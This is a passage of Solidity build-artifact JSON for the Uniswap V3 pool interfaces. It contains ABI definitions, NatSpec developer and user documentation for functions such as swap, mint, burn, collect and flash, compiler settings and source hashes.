",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"observations\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"blockTimestamp\",\"type\":\"uint32\"},{\"internalType\":\"int56\",\"name\":\"tickCumulative\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityCumulativeX128\",\"type\":\"uint160\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"The pool interface is broken up into many smaller pieces\",\"kind\":\"dev\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"factory()\":{\"returns\":{\"_0\":\"The contract address\"}},\"fee()\":{\"returns\":{\"_0\":\"The fee\"}},\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}},\"slot0()\":{\"returns\":{\"sqrtPriceX96\":\"The current price of the pool as a sqrt(token1/token0) Q64.96 value tick The current tick of the pool, i.e. according to the last tick transition that was run. This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick boundary. observationIndex The index of the last oracle observation that was written, observationCardinality The current maximum number of observations stored in the pool, observationCardinalityNext The next maximum number of observations, to be updated when the observation. feeProtocol The protocol fee for both tokens of the pool. Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0 is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee. unlocked Whether the pool is currently locked to reentrancy\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}},\"token0()\":{\"returns\":{\"_0\":\"The token contract address\"}},\"token1()\":{\"returns\":{\"_0\":\"The token contract address\"}}},\"title\":\"The interface for a Uniswap V3 Pool\",\"version\":1},\"userdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when a position's liquidity is removed\"},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"notice\":\"Emitted when fees are collected by the owner of a position\"},\"CollectProtocol(address,address,uint128,uint128)\":{\"notice\":\"Emitted when the collected protocol fees are withdrawn by the factory owner\"},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"notice\":\"Emitted by the pool for any flashes of token0/token1\"},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"notice\":\"Emitted by the pool for increases to the number of observations that can be stored\"},\"Initialize(uint160,int24)\":{\"notice\":\"Emitted exactly once by a pool when #initialize is first called on the pool\"},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when liquidity is minted for a given position\"},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"notice\":\"Emitted when the protocol fee is changed by the pool\"},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"notice\":\"Emitted by the pool for any swaps between token0 and token1\"}},\"kind\":\"user\",\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":\"IUniswapV3Pool\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when a position's liquidity is removed"
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"notice": "Emitted when fees are collected by the owner of a position"
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"notice": "Emitted when the collected protocol fees are withdrawn by the factory owner"
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"notice": "Emitted by the pool for any flashes of token0/token1"
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"notice": "Emitted by the pool for increases to the number of observations that can be stored"
							},
							"Initialize(uint160,int24)": {
								"notice": "Emitted exactly once by a pool when #initialize is first called on the pool"
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when liquidity is minted for a given position"
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"notice": "Emitted when the protocol fee is changed by the pool"
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"notice": "Emitted by the pool for any swaps between token0 and token1"
							}
						},
						"kind": "user",
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"IUniswapV3PoolActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
